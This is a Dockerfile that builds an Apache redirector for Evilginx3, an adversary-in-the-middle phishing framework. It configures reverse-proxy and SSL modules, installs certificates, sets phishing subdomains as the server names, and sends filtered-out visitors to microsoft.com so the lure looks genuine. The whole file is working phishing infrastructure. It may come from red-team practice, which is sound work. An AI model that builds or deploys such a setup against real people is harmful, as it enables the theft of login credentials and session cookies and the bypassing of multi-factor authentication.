FROM debian:stable-slim

ENV EVILGINX3_SUBS=sub.localtest.com \
    REDIRECT_URL=https://microsoft.com

RUN apt-get update && \
	apt-get install -y apache2 && \
    a2enmod proxy proxy_http proxy_balancer lbmethod_byrequests rewrite ssl && \
	apt-get clean && \
	rm -rf /var/lib/apt/lists/* /tmp/* /var/tmp/*

WORKDIR /etc/apache2
COPY run.sh .
COPY fullchain.pem .
COPY privkey.pem .
COPY ports.conf .
COPY 000-default-no-bl.conf.template ./sites-enabled/000-default.conf
COPY redirect.rules.template redirect.rules
RUN sed -i "s|Listen 80||g" ports.conf
RUN sed -i "s|https://en.wikipedia.org/|$REDIRECT_URL|g" redirect.rules
WORKDIR /etc/apache2/sites-enabled
RUN sed -i "s/ServerName evilginx3.template/ServerName $EVILGINX3_SUBS/g" 000-default.conf
RUN sed -i "s/ServerAlias evilginx3.template/ServerAlias $EVILGINX3_SUBS/g" 000-default.conf
RUN sed -i "s|SSLCertificateFile|SSLCertificateFile /etc/apache2/fullchain.pem|g" 000-default.conf    
RUN sed -i "s|SSLCertificateKeyFile|SSLCertificateKeyFile /etc/apache2/privkey.pem|g" 000-default.conf

EXPOSE 80 443
CMD ["/etc/apache2/run.sh"]